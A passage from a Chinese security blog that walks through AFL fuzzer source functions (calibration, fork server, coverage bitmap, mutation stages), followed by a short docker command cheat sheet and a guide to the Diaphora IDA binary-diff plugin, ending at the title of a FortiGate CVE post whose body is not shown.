<li>如果不是第一次运行，在第一轮calibrate stage结束时，显示界面，展示执行结果。</li>
<li>调用<strong>write_to_testcase(use_mem, q-&gt;len);<strong>，把测试内容记录到</strong>out_file</strong>中。</li>
<li>调用<strong>run_target(argv, use_tmout);<strong>执行测试样例，结果保存在</strong>fault</strong>中。</li>
<li>如果这是第一轮calibrate case，不是dumb mode，并且trace_bits没有记录到数据，则设置fault &#x3D; FAULT_NOINST，跳转到abort_calibration。</li>
<li>通过<strong>hash32(trace_bits, MAP_SIZE, HASH_CONST);<strong>计算出</strong>cksum</strong>。</li>
<li>如果<strong>q-&gt;exec_cksum !&#x3D; cksum</strong>，代表不是第一次运行，或者这个测试样例行为可变。<ul>
<li>u8 hnb &#x3D; has_new_bits(virgin_bits);</li>
<li>如果hnb &gt; new_bits，则new_bits &#x3D; hnb。</li>
<li>如果q-&gt;exec_cksum不为0，则代表不是第一次运行。<ul>
<li>如果var_bytes为空，并且first_trace[i] !&#x3D; trace_bits[i]，则设置var_bytes[i] &#x3D; 1，stage_max   &#x3D; CAL_CYCLES_LONG。</li>
<li>var_detected &#x3D; 1;</li>
</ul>
</li>
<li>否则，代表是第一次运行。<ul>
<li>设置q-&gt;exec_cksum &#x3D; cksum;</li>
<li>拷贝<strong>trace_bits</strong>进<strong>first_trace</strong></li>
</ul>
</li>
</ul>
</li>
<li>计算时间和轮次，并计算一些信息</li>
<li>如果new_bits &#x3D;&#x3D; 2 &amp;&amp; !q-&gt;has_new_cov，则设置q-&gt;has_new_cov &#x3D; 1，并且queued_with_cov++。</li>
<li>如果var_detected为1，则当前测试用例行为可变。调用mark_as_variable(q)，并且queued_variable++。</li>
<li>恢复stage值。</li>
<li>如果不是第一次运行stage则调用show_stats，展示状态。</li>
</ul>
</li>
</ul>
<h2 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver"></a>init_forkserver</h2><p>初始化<strong>fork server</strong>。</p>
<ul>
<li>建立状态管道<strong>st_pipe</strong>和控制管道<strong>ctl_pipe</strong>。</li>
<li>fork出子进程<ul>
<li>把<strong>FORKSRV_FD</strong>重定向到<strong>ctl_pipe[0]<strong>，把</strong>FORKSRV_FD+1</strong>重定向到**st_pipe[1]**。</li>
<li>关闭一些问价描述符。</li>
<li>调用<strong>execv(target_path, argv)<strong>。这里会执行我们之前插桩的程序，第一次执行时，会调用</strong>__afl_fork_wait_loop</strong>，以充当<strong>fork server</strong>。</li>
<li>如果失败，则*(u32*)trace_bits &#x3D; EXEC_FAIL_SIG。</li>
</ul>
</li>
<li>父进程<ul>
<li>关闭ctl_pipe[0]和st_pipe[1]。</li>
<li>等待<strong>fork server</strong>启动。<ul>
<li>能从**st_pipe[0]**读取到4字节即代表启动成功，超时则表示失败。</li>
</ul>
</li>
<li>子进程异常处理</li>
</ul>
</li>
</ul>
<h2 id="has-new-bits"><a href="#has-new-bits" class="headerlink" title="has_new_bits"></a>has_new_bits</h2><p>用来检查是否出现新路径以及是否边的命中次数发生变化。</p>
<ul>
<li>初始化<strong>current</strong>为<strong>trace_bits</strong>，<strong>virgin</strong>为<strong>virgin_map</strong>，ret&#x3D;0。</li>
<li>8字节一组遍历<strong>trace_bits</strong>。如果**(*(u32*)current)<strong>不为0，并且</strong>(*(u32*)current &amp; *(u32*)virgin)**不为0。则代表出现新的路径或者路径命中次数出现变化。<ul>
<li>如果ret&lt;2。<ul>
<li>如果存在**(cur[i] &amp;&amp; vir[i] &#x3D;&#x3D; 0xff)**，那么设置ret&#x3D;2，这代表出现新的路径。</li>
</ul>
</li>
<li>*virgin &amp;&#x3D; ~*current;</li>
</ul>
</li>
<li>如果ret存在，并且<strong>virgin_map &#x3D;&#x3D; virgin_bits</strong>，则设置bitmap_changed &#x3D; 1</li>
<li>返回ret</li>
</ul>
<h2 id="count-bytes"><a href="#count-bytes" class="headerlink" title="count_bytes"></a>count_bytes</h2><p>统计非零字节数</p>
<ul>
<li>每4字节一组遍历mem，u32* ptr &#x3D; (u32*)mem，ret&#x3D;0.</li>
<li>将ptr 与0xff，0xff00，0xff0000，0xff000000，分别相与，如果非零，则ret++。</li>
<li>返回ret，表示非零字节数。</li>
</ul>
<h2 id="run-target"><a href="#run-target" class="headerlink" title="run_target"></a>run_target</h2><p>用来fork出子进程进行fuzz测试。</p>
<ul>
<li>首先清空<strong>trace_bits</strong>（记录路径的共享内存）。</li>
<li>如果是dumb mode或者no_forkserver非零。<ul>
<li>fork出一个子进程，在关闭一系列文件描述符后，去执行**execv(target_path, argv)**。</li>
</ul>
</li>
<li>否则正常通过<strong>fork server</strong>来fork出一个进程进行fuzz。<ul>
<li>通过<strong>fsrv_ctl_fd</strong>写入4字节，来告诉fork server要开始fuzz。</li>
<li>再通过<strong>fsrv_st_fd</strong>读取4字节，判断fork server是否成功fork出子进程。</li>
</ul>
</li>
<li>AFL自己会等待fork出来的程序执行结束，并获取状态保存到status中。total_execs++。</li>
<li>调用classify_counts((u64*)trace_bits)。</li>
<li>根据<strong>status</strong>的值，返回fuzz执行状态。</li>
</ul>
<h2 id="classify-counts-u64-mem"><a href="#classify-counts-u64-mem" class="headerlink" title="classify_counts(u64* mem)"></a>classify_counts(u64* mem)</h2><p>用来对<strong>trace_bits</strong>进行分类规整。</p>
<ul>
<li><p>8字节一组遍历<strong>trace_bits</strong>。</p>
<ul>
<li>每次2字节进行规整。</li>
<li>代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mem16[<span class="number">0</span>] = count_class_lookup16[mem16[<span class="number">0</span>]];</span><br><span class="line">mem16[<span class="number">1</span>] = count_class_lookup16[mem16[<span class="number">1</span>]];</span><br><span class="line">mem16[<span class="number">2</span>] = count_class_lookup16[mem16[<span class="number">2</span>]];</span><br><span class="line">mem16[<span class="number">3</span>] = count_class_lookup16[mem16[<span class="number">3</span>]];</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h2><p>当发现新的路径时，判断触发新的路径的样例是否更加favorable，favorable的意思是当前路径是否包含最小的路径集合来遍历到bitmap中的所有位。</p>
<ul>
<li>fav_factor &#x3D; q-&gt;exec_us * q-&gt;len。</li>
<li>遍历trace_bits，如果trace_bits[i]存在，则代表这里所指的路径已被覆盖。<ul>
<li>如果fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len，则代表原来的更优，直接continue，去判断下一条路径。</li>
<li>否则就说明这个新样例对于当前边更加favorable，–top_rated[i]-&gt;tc_ref，top_rated[i]-&gt;trace_mini &#x3D; 0。</li>
</ul>
</li>
<li>替换top_rated[i]，top_rated[i] &#x3D; q，并且q-&gt;tc_ref++。</li>
<li>如果q-&gt;trace_mini&#x3D;&#x3D;0，则调用minimize_bits(q-&gt;trace_mini, trace_bits)。</li>
<li>score_changed &#x3D; 1</li>
</ul>
<h2 id="minimize-bits"><a href="#minimize-bits" class="headerlink" title="minimize_bits"></a>minimize_bits</h2><p>将描述边是否被覆盖到的以字节记录的<strong>trace_bits</strong>，转化为以<strong>bit</strong>记录的图。</p>
<h2 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h2><p>用来精简队列</p>
<ul>
<li>如果是dumb mode，或者score_changed&#x3D;&#x3D;0，那么就直接返回。</li>
<li>设置score_changed&#x3D;0，初始化temp_v[MAP_SIZE &gt;&gt; 3]为0xff。</li>
<li>遍历queue队列，使得q-&gt;favored &#x3D; 0。</li>
<li>遍历<strong>top_rated</strong>次。<ul>
<li>如果top_rated[i]存在，并且temp_v[i &gt;&gt; 3] &amp; (1 &lt;&lt; (i &amp; 7))存在。<ul>
<li>从temp_v中清除掉top_rated[i]所有覆盖到的边。</li>
<li>top_rated[i]-&gt;favored &#x3D; 1，queued_favored++。</li>
<li>如果top_rated[i]-&gt;was_fuzzed&#x3D;&#x3D;0，则pending_favored++。</li>
</ul>
</li>
</ul>
</li>
<li>遍历队列queue，调用mark_as_redundant(q, !q-&gt;favored)。</li>
</ul>
<h2 id="mark-as-redundant"><a href="#mark-as-redundant" class="headerlink" title="mark_as_redundant"></a>mark_as_redundant</h2><p>标记冗余队列。</p>
<ul>
<li>如果state &#x3D;&#x3D; q-&gt;fs_redundant，则直接返回。</li>
<li>设置q-&gt;fs_redundant &#x3D; state。</li>
<li>构造路径fn&#x3D;”out_dir&#x2F;queue&#x2F;.state&#x2F;redundant_edges&#x2F;q-&gt;fname”。</li>
<li>对state进行判断。<ul>
<li>state存在，则说明该队列冗余，创建文件fn。</li>
<li>state为空，则删除文件。</li>
</ul>
</li>
</ul>
<h2 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats"></a>show_init_stats</h2><p>初始化之后，显示一些信息，以及设置一些值。</p>
<h2 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position"></a>find_start_position</h2><p>用来查询开始队列的位置。</p>
<ul>
<li>如果resuming_fuzz&#x3D;&#x3D;0，则直接退出。</li>
<li>否则就找到fuzzer_stats文件，打开并找到cur_path，并设置为ret。</li>
<li>如果ret &gt;&#x3D; queued_paths，则ret&#x3D;0，返回ret。</li>
</ul>
<h2 id="write-stats-file"><a href="#write-stats-file" class="headerlink" title="write_stats_file"></a>write_stats_file</h2><p>用来更新fuzzer_stats文件。</p>
<h2 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto"></a>save_auto</h2><p>用来自动保存生成的extras。</p>
<ul>
<li>如果auto_changed&#x3D;&#x3D;0，则直接退出。</li>
<li>打开”out_dir&#x2F;queue&#x2F;.state&#x2F;auto_extras&#x2F;auto_%06u”文件，并写入a_extras[i].data。</li>
</ul>
<h2 id="fuzz-主循环"><a href="#fuzz-主循环" class="headerlink" title="fuzz 主循环"></a>fuzz 主循环</h2><p>fuzz的过程</p>
<ul>
<li><p>调用**cull_queue()**，精简队列。</p>
</li>
<li><p>如果queue_cur&#x3D;&#x3D;0，代表所有queue已被执行过。</p>
<ul>
<li><p>有以下设置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">queue_cycle++;</span><br><span class="line">current_entry     = <span class="number">0</span>;</span><br><span class="line">cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">queue_cur         = <span class="built_in">queue</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>调用show_stats，刷新界面。</p>
</li>
</ul>
</li>
<li><p>执行**skipped_fuzz &#x3D; fuzz_one(use_argv)**。</p>
</li>
</ul>
<h2 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h2><p>从queue中取出entry进行fuzz，成功返回0，否则返回1。</p>
<ul>
<li>如果<strong>pending_favored</strong>非0，并且当前queue已经被fuzz过，并且queue_cur-&gt;favored&#x3D;&#x3D;0，则有99%的概率直接返回1。</li>
<li>如果<strong>pending_favored</strong>为0，并且不是dumb mode，并且queue_cur-&gt;favored&#x3D;&#x3D;0，queued_paths &gt; 10。<ul>
<li>如果queue_cycle &gt; 1，并且queue没有被fuzz过，则有75%的概率直接返回1。</li>
<li>如果queue已经被fuzz过，则有95%的概率直接返回1。</li>
</ul>
</li>
<li>打开测试样例文件，并且设置len &#x3D; queue_cur-&gt;len，将文件映射到内存中，地址复制给orig_in，in_buf。</li>
</ul>
<p><strong>CALIBRATION阶段</strong></p>
<ul>
<li>如果queue_cur-&gt;cal_failed存在，并且queue_cur-&gt;cal_failed&lt;3，则再次调用calibrate_case(argv, queue_cur, in_buf, queue_cycle - 1, 0)。</li>
</ul>
<p><strong>TRIMMING阶段</strong></p>
<ul>
<li><p>如果不是dumb mode，并且queue没有被修剪过，则调用**trim_case(argv, queue_cur, in_buf)**。</p>
</li>
<li><p>len &#x3D; queue_cur-&gt;len，调用memcpy(out_buf, in_buf, len)。</p>
</li>
</ul>
<p><strong>PERFORMANCE SCORE</strong>阶段</p>
<ul>
<li>perf_score &#x3D; calculate_score(queue_cur)。</li>
<li>如果skip_deterministic存在，或者queue已经被fuzz过，或者queue_cur-&gt;passed_det存在，则跳转去havoc_stage。</li>
</ul>
<p><strong>SIMPLE BITFLIP</strong>阶段</p>
<p>bit翻转策略。</p>
<ul>
<li><p>定义了如下宏，这个宏的作用是，翻转_ar的(_bf) &gt;&gt; 3偏移处字节的，第7-((_bf) &amp; 7)比特。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FLIP_BIT(_ar, _b) do &#123; \</span></span><br><span class="line"><span class="meta">    u8* _arf = (u8*)(_ar); \</span></span><br><span class="line"><span class="meta">    u32 _bf = (_b); \</span></span><br><span class="line"><span class="meta">    _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7)); \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>bitflip 1&#x2F;1</strong>阶段，逐步翻转每一个字节的每一比特，并且调用common_fuzz_stuff(argv, out_buf, len)，之后会恢复这个比特。</p>
</li>
<li><p>并且如果在<strong>bitflip 1&#x2F;1</strong>阶段，连续翻转几个字节时，路径覆盖与原路径不一样，并且这几个新覆盖的路径一样，则AFL猜测这几个字节为token，并调用maybe_add_auto(a_collect, a_len)。</p>
</li>
<li><p><strong>bitflip 2&#x2F;1</strong>阶段，连续翻转2bit。</p>
</li>
<li><p><strong>bitflip 4&#x2F;1</strong>阶段，连续翻转4bit。</p>
</li>
<li><p>生成<strong>Effector map</strong>。这个结构的作用是使得AFL对文件格式有一定的判断，从而提高效率。如果将某个字节完全反转，也不能导致路径发生变化，那么这个字节可能就是<strong>data</strong>，对fuzz来说意义不大，在<strong>Effector map</strong>中标记为0，表示该字节无效，在以后变异中跳过这些字节，以节省资源。</p>
</li>
<li><p><strong>bitflip 8&#x2F;8</strong>阶段，以字节为单位进行翻转。在满足不是dumb mode和len &gt;&#x3D; 128的条件下，计算cksum，如果cksum !&#x3D; queue_cur-&gt;exec_cksum，那么标记<strong>eff_map[EFF_APOS(stage_cur)] &#x3D; 1</strong>，即代表这个字节值得变异。</p>
</li>
<li><p><strong>bitflip 16&#x2F;8</strong>阶段，以2字节为单位进行翻转，但是会跳过eff_map[EFF_APOS(stage_cur)]为0的字节。</p>
</li>
<li><p><strong>bitflip 32&#x2F;8</strong>阶段，以2字节为单位进行翻转，同样会跳过eff_map[EFF_APOS(stage_cur)]为0的字节。</p>
</li>
</ul>
<p><strong>ARITHMETIC INC&#x2F;DEC</strong>阶段</p>
<p>byte加减法策略。</p>
<ul>
<li><strong>arith 8&#x2F;8</strong>阶段，每8个bit，进行加减运算。</li>
<li><strong>arith 16&#x2F;8</strong>阶段，每16个bit，进行加减运算。</li>
<li><strong>arith 32&#x2F;8</strong>阶段，每32个bit，进行加减运算。</li>
<li>会跳过被eff_map认为无效的字段，以及跳过被变异过的测试样例。</li>
</ul>
<p><strong>INTERESTING VALUES</strong>阶段</p>
<p>byte替换策略。</p>
<ul>
<li><strong>interest 8&#x2F;8</strong>，每8个bit进行替换。</li>
<li><strong>interest 16&#x2F;8</strong>，每16个bit进行替换。</li>
<li><strong>interest 32&#x2F;8</strong>，每32个bit进行替换。</li>
<li>会跳过被eff_map认为无效的字段，以及跳过被变异过的测试样例。</li>
</ul>
<p><strong>DICTIONARY STUFF</strong>阶段</p>
<p>替换或插入tokens。</p>
<p><strong>RANDOM HAVOC</strong>阶段</p>
<p>dumb fuzz，完全随机的变异。</p>
<h2 id="sync-fuzzers"><a href="#sync-fuzzers" class="headerlink" title="sync_fuzzers"></a>sync_fuzzers</h2><p>读取其他fuzzer的测试样例，并进行测试，如果出现新路径，就保存到自己的queue文件夹里。</p>
<h2 id="trim-case"><a href="#trim-case" class="headerlink" title="trim_case"></a>trim_case</h2><p>修剪测试样例。</p>
<ul>
<li><p>如果测试样例小于5，则直接返回。</p>
</li>
<li><p>计算len_p2，len_p2 &#x3D; next_p2(q-&gt;len)，remove_len&#x3D;1&#x2F;16 * len_p2 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u32 <span class="title function_">next_p2</span><span class="params">(u32 val)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u32 ret = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (val &gt; ret) ret &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
</li>
<li><p>进入循环，循环跳出条件是remove_len&lt; 1&#x2F;1024 * len_p2。</p>
<ul>
<li>跳过in_buf从remove_pos偏移处的trim_avail字节，写入到.cur_input中。</li>
<li>调用**fault &#x3D; run_target(argv, exec_tmout)**，cksum &#x3D; hash32(trace_bits, MAP_SIZE, HASH_CONST)。</li>
<li>如果cksum &#x3D;&#x3D; q-&gt;exec_cksum，就把原本测试样例中少去的这段给删除，实现了测试样例的简化。</li>
<li>否则remove_pos +&#x3D; remove_len。</li>
<li>show_stats（）</li>
</ul>
</li>
<li><p>如果needs_write存在，则删除原测试样例，将简化后的测试样例写到同名文件中。</p>
</li>
<li><p>返回fault。</p>
</li>
</ul>
<h2 id="calculate-score"><a href="#calculate-score" class="headerlink" title="calculate_score"></a>calculate_score</h2><p>根据速度，覆盖路径数，路径深度计算出一个得分，havoc变异阶段用。</p>
<h2 id="common-fuzz-stuff"><a href="#common-fuzz-stuff" class="headerlink" title="common_fuzz_stuff"></a>common_fuzz_stuff</h2><p>写测试样例进文件并进行测试。</p>
<ul>
<li>如果<strong>post_handler</strong>存在，则先执行out_buf &#x3D; post_handler(out_buf, &amp;len)，对测试样例进行处理。</li>
<li>调用write_to_testcase(out_buf, len)，写入.cur_input。</li>
<li>调用fault &#x3D; run_target(argv, exec_tmout)。</li>
<li>如果fault &#x3D;&#x3D; FAULT_TMOUT，返回1。</li>
<li>调用queued_discovered +&#x3D; save_if_interesting(argv, out_buf, len, fault)。</li>
<li>show_stats()。</li>
<li>返回0。</li>
</ul>
<h2 id="write-to-testcase"><a href="#write-to-testcase" class="headerlink" title="write_to_testcase"></a>write_to_testcase</h2><p>从mem写len到.cur_input中。</p>
<h2 id="save-if-interesting"><a href="#save-if-interesting" class="headerlink" title="save_if_interesting"></a>save_if_interesting</h2><p>如果这个测试样例很有趣就保存下来，保存就返回1，否则返回0.</p>
<ul>
<li>如果fault &#x3D;&#x3D; crash_mode，但是没有出现新路径并且路径命中次数相同，则直接返回0.</li>
<li>调用add_to_queue(fn, len, 0)，添加新测试样例到队列中。</li>
<li>调用queue_top-&gt;exec_cksum &#x3D; hash32(trace_bits, MAP_SIZE, HASH_CONST)。</li>
<li>调用calibrate_case(argv, queue_top, mem, queue_cycle - 1, 0)评估queue。</li>
<li>根据fault的值进行不同处理。</li>
</ul>
<h2 id="simplify-trace"><a href="#simplify-trace" class="headerlink" title="simplify_trace"></a>simplify_trace</h2><ul>
<li><p>8字节一组，遍历trace_bits。</p>
<ul>
<li><p>如果mem不为空，mem8[i] &#x3D; simplify_lookup[mem8[i]]。</p>
</li>
<li><p>否则*mem &#x3D; 0x0101010101010101ULL，即代表这8个路径都没有命中。</p>
</li>
</ul>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#simplify-trace">https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#simplify-trace</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2092">https://forum.butian.net/share/2092</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/12/02/docker%E5%B0%8F%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="fxc233">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fxc233's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/02/docker%E5%B0%8F%E8%AE%B0/" class="post-title-link" itemprop="url">docker小记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-12-02 23:11:13 / Modified: 23:36:59" itemprop="dateCreated datePublished" datetime="2023-12-02T23:11:13+08:00">2023-12-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>零零散散用过几次<strong>docker</strong>，不过由于使用次数少，所以经常会忘记它的命令，这次系统地整理并记录一下常用的指令。</p>
<h2 id="镜像相关"><a href="#镜像相关" class="headerlink" title="镜像相关"></a>镜像相关</h2><h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure>

<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull image_name</span><br></pre></td></tr></table></figure>

<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi image_id</span><br></pre></td></tr></table></figure>

<h2 id="容器相关"><a href="#容器相关" class="headerlink" title="容器相关"></a>容器相关</h2><h3 id="创建并启动容器"><a href="#创建并启动容器" class="headerlink" title="创建并启动容器"></a>创建并启动容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name=&quot;xxx&quot; -v /local_path:/docker_path image_id /bin/sh</span><br></pre></td></tr></table></figure>

<h3 id="启动-停止容器"><a href="#启动-停止容器" class="headerlink" title="启动&#x2F;停止容器"></a>启动&#x2F;停止容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start/stop container_id</span><br></pre></td></tr></table></figure>

<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm container_id</span><br></pre></td></tr></table></figure>

<h3 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it container_id /bin/sh</span><br></pre></td></tr></table></figure>

<h2 id="Docker-镜像制作"><a href="#Docker-镜像制作" class="headerlink" title="Docker 镜像制作"></a>Docker 镜像制作</h2><h3 id="容器转为镜像"><a href="#容器转为镜像" class="headerlink" title="容器转为镜像"></a>容器转为镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit container_id image_name:version</span><br></pre></td></tr></table></figure>

<h2 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h2><p><strong>Vscode</strong>下载<strong>Remote-ssh</strong>和<strong>Docker</strong>插件，之后就可以远程连上去进行编辑。</p>
<p><img src="/img/docker%E5%B0%8F%E8%AE%B0/1.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/11/20/IDA-diff%E6%8F%92%E4%BB%B6-diaphora%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="fxc233">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fxc233's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/20/IDA-diff%E6%8F%92%E4%BB%B6-diaphora%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">IDA-diff插件-diaphora使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-20 09:32:15" itemprop="dateCreated datePublished" datetime="2023-11-20T09:32:15+08:00">2023-11-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-12-02 23:36:41" itemprop="dateModified" datetime="2023-12-02T23:36:41+08:00">2023-12-02</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>前几天打了<strong>datacon</strong>，需要寻找埋在二进制文件里的漏洞。一种不错的方式是找两个版本靠近二进制文件进行<strong>diff</strong>一下。之前笔者都是通过<strong>bindiff+ghidra</strong>来进行<strong>diff</strong>二进制文件的，对于看习惯了<strong>IDA</strong>界面的我而言，总感觉<strong>ghidra</strong>界面看起来不够舒服。于是找到了<strong>diaphora</strong>这个<strong>IDA</strong>的插件（项目地址：<a target="_blank" rel="noopener" href="https://github.com/joxeankoret/diaphora">https://github.com/joxeankoret/diaphora</a> ），专门用来对二进制文件进行<strong>diff</strong>，使用起来也极为简单便捷。这这里记录一下使用方法。</p>
<p>首先用<strong>IDA</strong>打开第一个二进制文件，File-&gt;Script file里选择<strong>diaphora.py</strong>。弹出<strong>Diaphora</strong>界面后直接点击OK，把第一个文件的数据导入数据库中，记住sqlite的位置。等待<strong>Diaphora</strong>运行完毕之后，即可关闭第一个IDA界面。</p>
<p><img src="/img/IDA-diff%E6%8F%92%E4%BB%B6-diaphora%E4%BD%BF%E7%94%A8/1.png"></p>
<p>然后用<strong>IDA</strong>打开第二个二进制文件，用同样的方式运行<strong>diaphora.py</strong>之后，把刚才生成的sqlite的路径填到，<strong>SQLite database to diff against</strong>中，再点击OK运行。</p>
<p><img src="/img/IDA-diff%E6%8F%92%E4%BB%B6-diaphora%E4%BD%BF%E7%94%A8/2.png"></p>
<p>运行完成之后即可看到<strong>diff</strong>的结果，看起来很舒服。</p>
<p><img src="/img/IDA-diff%E6%8F%92%E4%BB%B6-diaphora%E4%BD%BF%E7%94%A8/3.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/11/06/CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="fxc233">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fxc233's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/06/CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow/" class="post-title-link" itemprop="url">CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-06 14:22:07" itemprop="dateCreated datePublished" datetime="2023-11-06T14:22:07+08:00">2023-11-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-12-02 23:37:08" itemprop="dateModified" datetime="2023-12-02T23:37:08+08:00">2023-12-02</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
